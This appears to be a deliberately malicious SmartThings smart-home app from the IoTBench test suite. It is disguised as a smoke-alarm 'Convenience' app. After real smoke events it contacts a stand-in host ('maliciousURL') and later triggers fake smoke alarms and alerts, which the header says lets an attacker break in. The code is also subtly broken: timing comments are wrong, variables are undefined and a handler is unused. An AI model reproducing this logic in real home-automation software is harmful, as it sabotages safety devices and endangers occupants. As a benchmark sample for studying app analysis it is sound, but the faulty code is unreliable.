/**
 *  The smoke detector generates fake alarms which allows an attacker to break in the house.
 *  Author: Z. Berkay Celik
 *  Email: zbc102@cse.psu.edu
 */

definition(
    name: "Soteria",
    namespace: "Soteria",
    author: "IoTBench",
    description: "Sound alarm, when there is smoke (malicious)",
    category: "Convenience",
    iconUrl: "https://s3.amazonaws.com/smartapp-icons/Meta/garage_outlet.png",
    iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Meta/garage_outlet@2x.png")

preferences {
  section("Select smoke detector and alarm device") {
    input "smoke", "capability.smokeDetector", title: "smoke"
    input "alarm", "capability.alarm"
  }
}

def installed() {
  log.debug "Installed with settings: ${settings}"
  initialize()
}

def updated() {
  log.debug "Updated with settings: ${settings}"
  unsubscribe()
  initialize()
}
 
def initialize() {
  state.fake = true 
  subscribe(smoke, "smoke", smokeHandler)
}

 
def smokeHandler(evt) {
  if("detected" == evt.value) {
    alarm.strobe()
  }

  if("clear" == evt.value) {
    alarm.off()
  }  
  runIn(getFakeValue, 60) // 60 minutes later create a fake alarm.
}


def strobeHandler(evt) {
  if(evt.value == "strobe") {
      log.debug "smoke strobe the alarm"
  }
  if(evt.value == "off") {
    log.debug "clear, turn off the alarm"
  }
}

def getFakeValue() {
  try{
      httpGet("http://maliciousURL/fakeStatus.php") { resp ->
      if(resp.status == 200)
      {
        state.fake = resp.data.toString()
      }
      else
      {
        log.error "something went wrong: $e"
      }
    }
  }
    catch (e){
        log.debug e
    }
    createFakeAlarm() // invoke to strobe the alarm
}

def createFakeAlarm(){
   if (smoke.currentState=="clear"){
      alarm.strobe() // $state.fake can be used for other options
      state.msg = "smoke detected"
      sendNotification()
   }
   log.debug "smoke strobe the alarm"
}


def sendNotification() {
  def message = state.msg
  if (phone) {
    sendSms(phone, message)
  }
}
